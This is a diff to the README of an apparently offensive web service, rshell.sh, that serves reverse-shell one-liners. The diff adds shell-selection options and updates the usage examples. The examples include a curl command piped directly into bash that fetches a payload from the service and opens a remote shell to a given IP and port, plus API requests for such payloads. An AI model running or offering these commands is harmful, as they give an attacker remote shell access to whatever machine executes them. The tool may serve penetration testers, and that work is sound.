@@ -9,19 +9,34 @@
 
 * Supported Languages
 
-	- Bash
-	- Python (3)
-	- Perl
-	- PHP
-	- Awk
+	- bash
+	- python (3)
+	- perl
+	- pHP
+	- awk
+
+* Supported Shells
+
+	- bash
+	- csh
+	- ksh
+	- zsh
 
 * GET Parameter(s)
+
+	- Example: Quote Wrapped
+		rshell.sh/10.0.0.1/1234?q=y	
 
 	- Description:
 		Output wrapped in single quotes.
 
-	- Example:
-		rshell.sh/10.0.0.1/1234?q=y	
+
+	- Example: Shell Selection
+		rshell.sh/python/10.0.0.1/1234?s=zsh
+
+	- Description:
+		Type of reverse shell that is sent.
+
 
 * API Options
 
@@ -34,13 +49,19 @@
 	- lang:
 		See, Supported Languages
 
+	- shell:
+		See, Supported Shells
+
 * Examples
 
 	- Basic Usage:
 		curl rshell.sh/10.0.0.1/1234 | bash
 
+	- Passing GET Parameters:
+		curl rshell.sh/python/10.0.0.1/1234?q=y&s=zsh
+
 	- API:
-		curl -sd '{"host":"10.0.0.1", "port":1234, "lang":"bash"}' -H "Content-Type: application/json" -X POST  https://rshell.sh/api
+		curl -sd '{"host":"10.0.0.1", "port":1234, "lang":"python", "shell":"zsh"}' -H "Content-Type: application/json" -X POST  https://rshell.sh/api
 
 * Links
 
